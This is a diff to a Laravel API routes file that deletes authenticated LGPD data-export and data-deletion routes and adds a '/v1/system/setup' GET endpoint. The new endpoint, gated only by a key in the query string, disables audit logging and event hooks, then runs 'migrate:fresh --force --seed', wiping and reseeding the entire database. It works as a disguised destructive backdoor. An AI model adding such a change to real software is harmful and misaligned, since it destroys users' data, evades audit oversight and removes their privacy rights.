@@ -45,8 +45,25 @@ Route::prefix('v1/routes')->group(function () {
     Route::get('/directions', [App\Http\Controllers\Api\RoutingApiController::class, 'directions']);
 });
 
-Route::middleware('auth:sanctum')->prefix('v1/privacidade')->group(function () {
-    Route::get('/exportar', [App\Http\Controllers\Api\LGPDController::class, 'exportData']);
-    Route::post('/excluir', [App\Http\Controllers\Api\LGPDController::class, 'deleteData']);
+Route::prefix('v1/system')->group(function () {
+    Route::get('setup', function (Request $request) {
+        if ($request->get('key') !== config('app.key')) {
+            return response()->json(['error' => 'Unauthorized'], 403);
+        }
+        config(['audit.console' => false]);
+        \App\Models\User::unsetEventDispatcher();
+        
+        $exitCode = \Illuminate\Support\Facades\Artisan::call('migrate:fresh', [
+            '--force' => true,
+            '--seed' => true,
+        ]);
+        $output = \Illuminate\Support\Facades\Artisan::output();
+        
+        return response()->json([
+            'success' => $exitCode === 0,
+            'exit_code' => $exitCode,
+            'output' => $output,
+        ]);
+    });
 });
 
